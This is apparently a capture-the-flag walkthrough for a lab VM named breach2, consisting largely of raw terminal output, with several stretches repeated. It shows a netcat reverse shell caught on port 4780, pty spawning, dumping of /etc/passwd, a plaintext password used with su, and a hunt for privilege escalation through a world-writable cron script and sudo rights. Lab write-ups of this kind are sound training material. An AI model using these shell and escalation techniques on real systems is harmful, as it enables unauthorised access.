drwxr-xr-x  5 root  root  4096 Jun 19 16:42 ..
-rw-------  1 peter peter  113 Jun 21 10:49 .bash_history
-rw-r--r--  1 peter peter  220 Jun 14 15:55 .bash_logout
-rw-r--r--  1 peter peter 3515 Jun 14 15:55 .bashrc
drwx------  7 peter peter 4096 Jun 19 16:42 .cache
drwx------ 12 peter peter 4096 Jun 19 16:42 .config
drwx------  3 peter peter 4096 Jun 19 16:42 .dbus
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Desktop
-rw-------  1 peter peter   26 Jun 18 18:57 .dmrc
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Documents
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Downloads
-rwxrwxrwx  1 root  root   118 Jun 19 16:10 firefox.sh
drwx------  3 peter peter 4096 Jun 19 16:42 .gconf
drwx------  2 peter peter 4096 Jun 19 16:42 .gnupg
-rw-------  1 peter peter  636 Jun 14 15:59 .ICEauthority
drwx------  4 peter peter 4096 Jun 19 16:42 .kde
drwx------  3 peter peter 4096 Jun 19 16:42 .local
drwx------  4 peter peter 4096 Jun 19 16:42 .mozilla
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Music
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Pictures
-rw-r--r--  1 peter peter  675 Jun 14 15:55 .profile
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Public
-rw-r--r--  1 peter peter   66 Jun 15 11:47 .selected_editor
drwx------  2 peter peter 4096 Jun 19 16:42 .ssh
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Templates
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Videos
-rw-------  1 peter peter    0 Jun 18 19:13 .Xauthority
which nc
/bin/nc
cd .ssh
ls
Desktop
Documents
Downloads
firefox.sh
Music
Pictures
Public
Templates
Videos
pwd
/home/peter
cd .ssh
ls
Desktop
Documents
Downloads
firefox.sh
Music
Pictures
Public
Templates
Videos
ls -l .ssh
total 0

## Persistent shell
 
At this point, I fireed a netcat shell back to me on port 4780:

```
root@kali:~/.ssh# nc -lvp 4780
listening on [any] 4780 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 35443
python -c 'import pty; pty.spawn("/bin/sh")'

$ ls -la
ls -la
total 108
drwxr-xr-x 19 peter peter 4096 Jun 19 16:42 .
drwxr-xr-x  5 root  root  4096 Jun 19 16:42 ..
-rw-------  1 peter peter  113 Jun 21 10:49 .bash_history
-rw-r--r--  1 peter peter  220 Jun 14 15:55 .bash_logout
-rw-r--r--  1 peter peter 3515 Jun 14 15:55 .bashrc
drwx------  7 peter peter 4096 Jun 19 16:42 .cache
drwx------ 12 peter peter 4096 Jun 19 16:42 .config
drwx------  3 peter peter 4096 Jun 19 16:42 .dbus
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Desktop
-rw-------  1 peter peter   26 Jun 18 18:57 .dmrc
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Documents
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Downloads
-rwxrwxrwx  1 root  root   118 Jun 19 16:10 firefox.sh
drwx------  3 peter peter 4096 Jun 19 16:42 .gconf
drwx------  2 peter peter 4096 Jun 19 16:42 .gnupg
-rw-------  1 peter peter  636 Jun 14 15:59 .ICEauthority
drwx------  4 peter peter 4096 Jun 19 16:42 .kde
drwx------  3 peter peter 4096 Jun 19 16:42 .local
drwx------  4 peter peter 4096 Jun 19 16:42 .mozilla
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Music
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Pictures
-rw-r--r--  1 peter peter  675 Jun 14 15:55 .profile
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Public
-rw-r--r--  1 peter peter   66 Jun 15 11:47 .selected_editor
drwx------  2 peter peter 4096 Jun 25 11:29 .ssh
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Templates
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Videos
-rw-------  1 peter peter    0 Jun 18 19:13 .Xauthority
```
Some files there, we still need to move our privs up from Peter to root though.

```
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:109::/var/run/dbus:/bin/false
avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
Debian-exim:x:106:112::/var/spool/exim4:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
geoclue:x:110:117::/var/lib/geoclue:/bin/false
rtkit:x:113:121:RealtimeKit,,,:/proc:/bin/false
saned:x:114:122::/var/lib/saned:/bin/false
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
Debian-gdm:x:116:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:112:125:MySQL Server,,,:/nonexistent:/bin/false
blumbergh:x:1001:1001::/home/blumbergh:/bin/false
milton:x:1002:1002::/home/milton:/bin/bash
telnetd:x:117:126::/nonexistent:/bin/false
dnsmasq:x:118:65534:dnsmasq,,,:/var/lib/misc:/bin/false
```
So there's a couple of users ```blumbergh```` and ```milton```

I decide to check what crontab has to say too:

```
$ crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/4 * * * * cd /home/peter && ./firefox.sh
```

## Milton And Bill

Let's see if Milton and Bill have anything to say:

```
$ cd /home
cd /home
$ ls
ls
bill  milton  peter
$ cd milton
cd milton
$ ls -la
ls -la
total 120
drwxr-xr-x 16 milton milton  4096 Jun 19 16:42 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
$ cat .flair.sh
cat .flair.sh
#!/bin/bash

service nginx start
$ cd ../bill
cd ../bill
$ ls -la
ls -la
total 8
drwxr-xr-x 2 blumbergh blumbergh 4096 Jun 19 16:42 .
drwxr-xr-x 5 root      root      4096 Jun 19 16:42 ..
$ cd ..
cd ..
$ ls
ls
bill  milton  peter
$ cd milton
cd milton
$ ls
$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.5 (jessie)
Release:	8.5
Codename:	jessie
$ uname -a
uname -a
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
$ cd /usr/local/bin
cd /usr/local/bin
$ ls
ls
$ cd ..
cd ..
$ ls
ls
bin  etc  games  include  lib  man  sbin  selenium  share  src
$ cd sbin
cd sbin
$ ls -la
ls -la
total 8
drwxrwsr-x  2 root staff 4096 Jun 19 16:42 .
drwxrwsr-x 11 root staff 4096 Jun 19 16:42 ..
$ ls -lah /var/spool
ls -lah /var/spool
total 28K
drwxr-xr-x  7 root        root        4.0K Jun 14 15:54 .
drwxr-xr-x 12 root        root        4.0K Jun 14 23:22 ..
drwxr-xr-x  2 root        root        4.0K Jun 14 15:55 anacron
drwxr-xr-x  5 root        root        4.0K Jun 14 15:51 cron
drwxr-x---  5 Debian-exim Debian-exim 4.0K Jun 14 15:54 exim4
drwxr-xr-x  3 root        root        4.0K Jun 14 15:50 libreoffice
lrwxrwxrwx  1 root        root           7 Jun 14 15:43 mail -> ../mail
drwx------  2 root        root        4.0K Dec 19  2015 rsyslog
$ ls -lah /var/spool/mail
ls -lah /var/spool/mail
lrwxrwxrwx 1 root root 7 Jun 14 15:43 /var/spool/mail -> ../mail
```

So Milton can start a eb server with some flair. Yeeeeeeeeeeeeeah, I'm going to need to investigate that.

:

$ su milton
su milton
Password: coffeestains

su: Module is unknown
$ pwd
pwd
/home/milton
$ ls -la
ls -la
total 120
drwxr-xr-x 16 milton milton  4096 Jun 19 16:42 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
$ netst 
netst 
/bin/sh: 51: netst: not found
$ netstat
netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      






a
a
tcp        0    124 192.168.110.151:35443   192.168.110.128:4780    ESTABLISHED
tcp        0      0 192.168.110.151:34681   192.168.110.128:4444    ESTABLISHED
tcp        0      0 192.168.110.151:43415   192.168.110.128:1390    ESTABLISHED
udp        0      0 192.168.110.151:56018   192.168.72.2:domain     ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    7710     /run/systemd/notify
unix  2      [ ]         DGRAM                    7728     /run/systemd/shutdownd
unix  6      [ ]         DGRAM                    7730     /run/systemd/journal/dev-log
unix  5      [ ]         DGRAM                    7739     /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    8181     /run/systemd/journal/syslog
unix  3      [ ]         STREAM     CONNECTED     10952    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     11205    
unix  2      [ ]         DGRAM                    10962    
unix  3      [ ]         STREAM     CONNECTED     10739    /run/systemd/journal/stdout
unix  2      [ ]         STREAM     CONNECTED     79325    
unix  3      [ ]         STREAM     CONNECTED     10910    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     11206    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     11047    
unix  2      [ ]         DGRAM                    8312     
unix  3      [ ]         STREAM     CONNECTED     10951    
unix  2      [ ]         DGRAM                    11017    
unix  3      [ ]         STREAM     CONNECTED     10609    
unix  3      [ ]         STREAM     CONNECTED     10738    
unix  3      [ ]         STREAM     CONNECTED     79341    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     10654    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     10610    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    9892     
unix  3      [ ]         STREAM     CONNECTED     11049    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     11050    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     10968    
unix  2      [ ]         DGRAM                    8185     
unix  3      [ ]         STREAM     CONNECTED     11038    
unix  2      [ ]         DGRAM                    11222    
unix  3      [ ]         STREAM     CONNECTED     10324    
unix  3      [ ]         DGRAM                    8323     
unix  3      [ ]         STREAM     CONNECTED     11422    
unix  3      [ ]         STREAM     CONNECTED     10653    
unix  3      [ ]         STREAM     CONNECTED     79340    
unix  3      [ ]         STREAM     CONNECTED     10325    
unix  3      [ ]         STREAM     CONNECTED     10955    
unix  3      [ ]         STREAM     CONNECTED     79335    
unix  3      [ ]         STREAM     CONNECTED     11421    
unix  3      [ ]         STREAM     CONNECTED     11039    
unix  2      [ ]         DGRAM                    11245    
unix  3      [ ]         STREAM     CONNECTED     10909    
unix  3      [ ]         DGRAM                    8324     
unix  3      [ ]         STREAM     CONNECTED     11048    
unix  3      [ ]         STREAM     CONNECTED     79334    
$ $ $ $ /bin/sh: 56: a: not found
$ netstat -lnt
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:49235           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:25                  :::*                    LISTEN     
tcp6       0      0 :::111                  :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::51254                :::*                    LISTEN     
$ telnet localhost 2323
telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W 
breach2 login: 

Password: 


Login incorrect
breach2 login: 

Password: 


Login incorrect
root@kali:~/.ssh# nc -lvp 4780
listening on [any] 4780 ...
192.168.110.151: inverse host lookup failed: Unknown host
connect to [192.168.110.128] from (UNKNOWN) [192.168.110.151] 35443

ls -ld .ssh
drwx------ 2 peter peter 4096 Jun 25 11:29 .ssh
cd .ssh
ls -la
total 12
drwx------  2 peter peter 4096 Jun 25 11:29 .
drwxr-xr-x 19 peter peter 4096 Jun 19 16:42 ..
-rw-r--r--  1 peter peter  392 Jun 25 11:29 authorized_keys
chmod 600 authorized_keys
ifconfig
python -c 'import pty; pty.spawn("/bin/sh")'
$ crontab -e
crontab -e
Error opening terminal: unknown.
crontab: "/usr/bin/sensible-editor" exited with status 1
$ ls
ls
authorized_keys
$ ls -l
ls -l
total 4
-rw------- 1 peter peter 392 Jun 25 11:29 authorized_keys
$ cd ..
cd ..
$ ls
ls
Desktop    Downloads   Music	 Public     Videos
Documents  firefox.sh  Pictures  Templates
$ ls -la
ls -la
total 108
drwxr-xr-x 19 peter peter 4096 Jun 19 16:42 .
drwxr-xr-x  5 root  root  4096 Jun 19 16:42 ..
-rw-------  1 peter peter  113 Jun 21 10:49 .bash_history
-rw-r--r--  1 peter peter  220 Jun 14 15:55 .bash_logout
-rw-r--r--  1 peter peter 3515 Jun 14 15:55 .bashrc
drwx------  7 peter peter 4096 Jun 19 16:42 .cache
drwx------ 12 peter peter 4096 Jun 19 16:42 .config
drwx------  3 peter peter 4096 Jun 19 16:42 .dbus
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Desktop
-rw-------  1 peter peter   26 Jun 18 18:57 .dmrc
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Documents
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Downloads
-rwxrwxrwx  1 root  root   118 Jun 19 16:10 firefox.sh
drwx------  3 peter peter 4096 Jun 19 16:42 .gconf
drwx------  2 peter peter 4096 Jun 19 16:42 .gnupg
-rw-------  1 peter peter  636 Jun 14 15:59 .ICEauthority
drwx------  4 peter peter 4096 Jun 19 16:42 .kde
drwx------  3 peter peter 4096 Jun 19 16:42 .local
drwx------  4 peter peter 4096 Jun 19 16:42 .mozilla
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Music
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Pictures
-rw-r--r--  1 peter peter  675 Jun 14 15:55 .profile
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Public
-rw-r--r--  1 peter peter   66 Jun 15 11:47 .selected_editor
drwx------  2 peter peter 4096 Jun 25 11:29 .ssh
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Templates
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Videos
-rw-------  1 peter peter    0 Jun 18 19:13 .Xauthority
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:109::/var/run/dbus:/bin/false
avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
Debian-exim:x:106:112::/var/spool/exim4:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
geoclue:x:110:117::/var/lib/geoclue:/bin/false
rtkit:x:113:121:RealtimeKit,,,:/proc:/bin/false
saned:x:114:122::/var/lib/saned:/bin/false
usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
Debian-gdm:x:116:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:112:125:MySQL Server,,,:/nonexistent:/bin/false
blumbergh:x:1001:1001::/home/blumbergh:/bin/false
milton:x:1002:1002::/home/milton:/bin/bash
telnetd:x:117:126::/nonexistent:/bin/false
dnsmasq:x:118:65534:dnsmasq,,,:/var/lib/misc:/bin/false
$ ls
ls
Desktop    Downloads   Music	 Public     Videos
Documents  firefox.sh  Pictures  Templates
$ ls -la
ls -la
total 108
drwxr-xr-x 19 peter peter 4096 Jun 19 16:42 .
drwxr-xr-x  5 root  root  4096 Jun 19 16:42 ..
-rw-------  1 peter peter  113 Jun 21 10:49 .bash_history
-rw-r--r--  1 peter peter  220 Jun 14 15:55 .bash_logout
-rw-r--r--  1 peter peter 3515 Jun 14 15:55 .bashrc
drwx------  7 peter peter 4096 Jun 19 16:42 .cache
drwx------ 12 peter peter 4096 Jun 19 16:42 .config
drwx------  3 peter peter 4096 Jun 19 16:42 .dbus
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Desktop
-rw-------  1 peter peter   26 Jun 18 18:57 .dmrc
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Documents
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Downloads
-rwxrwxrwx  1 root  root   118 Jun 19 16:10 firefox.sh
drwx------  3 peter peter 4096 Jun 19 16:42 .gconf
drwx------  2 peter peter 4096 Jun 19 16:42 .gnupg
-rw-------  1 peter peter  636 Jun 14 15:59 .ICEauthority
drwx------  4 peter peter 4096 Jun 19 16:42 .kde
drwx------  3 peter peter 4096 Jun 19 16:42 .local
drwx------  4 peter peter 4096 Jun 19 16:42 .mozilla
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Music
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Pictures
-rw-r--r--  1 peter peter  675 Jun 14 15:55 .profile
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Public
-rw-r--r--  1 peter peter   66 Jun 15 11:47 .selected_editor
drwx------  2 peter peter 4096 Jun 25 11:29 .ssh
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Templates
drwxr-xr-x  2 peter peter 4096 Jun 19 16:42 Videos
-rw-------  1 peter peter    0 Jun 18 19:13 .Xauthority
$ crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/4 * * * * cd /home/peter && ./firefox.sh
$ cd /home
cd /home
$ ls
ls
bill  milton  peter
$ cd milton
cd milton
$ ls -la
ls -la
total 120
drwxr-xr-x 16 milton milton  4096 Jun 19 16:42 .
drwxr-xr-x  5 root   root    4096 Jun 19 16:42 ..
-rw-------  1 milton milton   562 Jun 18 18:55 .bash_history
drwxr-xr-x  3 milton milton  4096 Jun 18 18:23 .cache
drwx------  5 milton milton  4096 Jun 18 18:23 .config
drwx------  3 milton milton  4096 Jun 18 18:22 .dbus
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Desktop
-rw-------  1 milton milton    26 Jun 18 18:22 .dmrc
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Documents
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Downloads
-rwxr-xr-x  1 milton milton    33 Jun 15 18:25 .flair.sh
drwx------  4 milton milton  4096 Jun 18 18:23 .kde
drwxr-xr-x  3 milton milton  4096 Jun 18 18:22 .local
drwx------  4 milton milton  4096 Jun 18 18:24 .mozilla
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Music
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Pictures
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Public
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Templates
drwxr-xr-x  2 milton milton  4096 Jun 18 18:22 Videos
-rw-------  1 milton milton     0 Jun 18 18:55 .Xauthority
-rw-------  1 milton milton 44381 Jun 18 18:56 .xsession-errors
$ cat .flair.sh
cat .flair.sh
#!/bin/bash

service nginx start
$ cd ../bill
cd ../bill
$ ls -la
ls -la
total 8
drwxr-xr-x 2 blumbergh blumbergh 4096 Jun 19 16:42 .
drwxr-xr-x 5 root      root      4096 Jun 19 16:42 ..
$ cd ..
cd ..
$ ls
ls
bill  milton  peter
$ cd milton
cd milton
$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
$ ls
ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.5 (jessie)
Release:	8.5
Codename:	jessie
$ uname -a
uname -a
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
$ cd /usr/local/bin
cd /usr/local/bin
$ ls
ls
$ cd ..
cd ..
$ ls
ls
bin  etc  games  include  lib  man  sbin  selenium  share  src
$ cd sbin
cd sbin
$ ls -la
ls -la
total 8
drwxrwsr-x  2 root staff 4096 Jun 19 16:42 .
drwxrwsr-x 11 root staff 4096 Jun 19 16:42 ..
$ ls -lah /var/spool
ls -lah /var/spool
total 28K
drwxr-xr-x  7 root        root        4.0K Jun 14 15:54 .
drwxr-xr-x 12 root        root        4.0K Jun 14 23:22 ..
drwxr-xr-x  2 root        root        4.0K Jun 14 15:55 anacron
drwxr-xr-x  5 root        root        4.0K Jun 14 15:51 cron
drwxr-x---  5 Debian-exim Debian-exim 4.0K Jun 14 15:54 exim4
drwxr-xr-x  3 root        root        4.0K Jun 14 15:50 libreoffice
lrwxrwxrwx  1 root        root           7 Jun 14 15:43 mail -> ../mail
drwx------  2 root        root        4.0K Dec 19  2015 rsyslog
$ ls -lah /var/spool/mail
ls -lah /var/spool/mail
lrwxrwxrwx 1 root root 7 Jun 14 15:43 /var/spool/mail -> ../mail
$ crontab -l
crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/4 * * * * cd /home/peter && ./firefox.sh
$ sudo -l
sudo -l
Matching Defaults entries for peter on breach2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on breach2:
    (root) NOPASSWD: /etc/init.d/apache2
$ cd /etc/cron
cd /etc/cron
/bin/sh: 36: cd: can't cd to /etc/cron
$ cd /etc
cd /etc
$ ls cron*
ls cron*
crontab

cron.d:
anacron  php5

cron.daily:
0anacron  apt	    bsdmainutils  exim4-base  logrotate  mlocate
apache2   aptitude  dpkg	  htdig       man-db	 passwd

cron.hourly:

cron.monthly:
0anacron

cron.weekly:
0anacron  man-db
$ cat crontab
cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
